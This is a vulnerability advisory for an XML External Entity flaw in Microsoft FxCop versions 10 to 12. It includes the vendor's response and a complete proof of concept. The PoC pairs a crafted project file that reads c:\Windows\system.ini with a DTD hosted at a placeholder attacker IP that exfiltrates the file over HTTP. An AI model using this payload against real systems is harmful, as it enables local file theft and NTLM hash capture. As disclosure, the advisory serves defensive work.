Vendor:
========
www.microsoft.com


Product:
===========
Microsoft Windows "FxCop" v10-12



Vulnerability Type:
===================
XML External Entity



CVE Reference:
==============
N/A


Security Issue:
================
FxCop is vulnerable to XML injection attacks allowing local file
exfiltration and or NTLM hash theft. Tested in Windows 7 and Windows 10
download SDK it works in both.
If you have the the particular SDK in question it is probably there but
needs to be installed as it was for me.


MSRC Response:
=============
"We’ve determined that the issue was fixed in FxCop 14.0, but that it
repros in versions earlier than that (e.g. 10.0 -12.0  as far as SDKs are
concerned, with version 13.0 skipped).
We have confirmation that the SDKs for Win8+ don’t ship FxCop
We are going to pull Win7 SDKs containing v10-v12 of FxCop.  Dissecting
SDKs and replacing the tool in situ is fraught with peril, and chaining in
a later FxCop to run
after an SDK’s install (if even feasible) would just draw attention to the
problem.
Visual Studio (specifically, C++) ships a trimmed-down version of the
Windows 7 SDK, but it does not include FxCop, and so is unaffected.

In summary, newer versions of FxCop are unaffected and we will pull
afflicted versions from availability."


Exploit/POC:
=============
1) python -m SimpleHTTPServer

2) "POC.FxCop"

<?xml version="1.0"?>
<!DOCTYPE roottag [
<!ENTITY % file SYSTEM "c:\Windows\system.ini">
<!ENTITY % dtd SYSTEM "http://ATTACKER-IP:8000/payload.dtd">
%dtd;]>
<FxCopProject Version="1.36" Name="My FxCop Project">&send;</FxCopProject>


3) "payload.dtd"

<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % all "<!ENTITY send SYSTEM 'http://ATTACKER-IP:8000?%file;'>">
%all;

4) Import or Open "POC.FxCop" file in FxCop


Files get exfiltrated to attacker server.


Network Access:
===============
Remote



Severity:
=========
High
